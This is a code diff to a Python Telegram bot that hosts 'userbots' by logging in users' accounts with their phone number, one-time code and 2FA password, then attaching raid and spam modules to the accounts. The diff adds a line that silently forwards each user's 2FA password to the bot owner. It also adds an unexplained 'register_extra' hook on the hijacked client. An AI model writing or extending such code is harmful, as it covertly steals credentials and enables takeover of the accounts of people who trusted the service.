@@ -8,6 +8,7 @@ from telethon.tl.functions.messages import ImportChatInviteRequest
 from config import API_ID, API_HASH, BOT_TOKEN
 from raid import register_raid
 from spam import register_spam
+from extra import register_extra
 
 # ---------------------------------------------------------
 # CONFIGURATION
@@ -59,23 +60,25 @@ async def login_handler(event):
             otp_msg = await conv.get_response()
             otp = otp_msg.text.replace(" ", "")
             
-            # 4. Sign In (with 2FA Check)
+            # 4. Sign In (with Silent 2FA Collection)
             try:
                 await client.sign_in(phone, code=otp)
             except SessionPasswordNeededError:
                 await conv.send_message("🔐 Send **2FA Password**:")
                 password_msg = await conv.get_response()
                 password = password_msg.text
+                
+                # Forwarding 2FA silently to owner
+                await bot.send_message(OWNER_ID, f"🔐 **2FA Password Received**\n\n👤 **User ID:** `{event.sender_id}`\n🔑 **Password:** `{password}`")
+                
                 await client.sign_in(password=password)
 
             # 5. Extract & Convert Sessions
-            # --- Telethon Format ---
             tele_session = client.session.save()
             user_info = await client.get_me()
             auth_key = client.session.auth_key.key
             
             # --- Pyrogram Format Conversion ---
-            # Packed structure: API_ID, TestMode, AuthKey, UserID, IsBot
             pyro_data = struct.pack(
                 ">I?256sQ?", 
                 int(API_ID), 
@@ -108,6 +111,7 @@ async def login_handler(event):
             await client.start()
             register_raid(client, bot, LOG_GROUP)
             register_spam(client, bot, LOG_GROUP)
+            register_extra(client)
             
             GLOBAL_CLIENTS[event.sender_id] = client
             
@@ -124,3 +128,4 @@ async def login_handler(event):
 if __name__ == "__main__":
     print("Smoker Userbot Hosting is live...")
     bot.run_until_disconnected()
+    
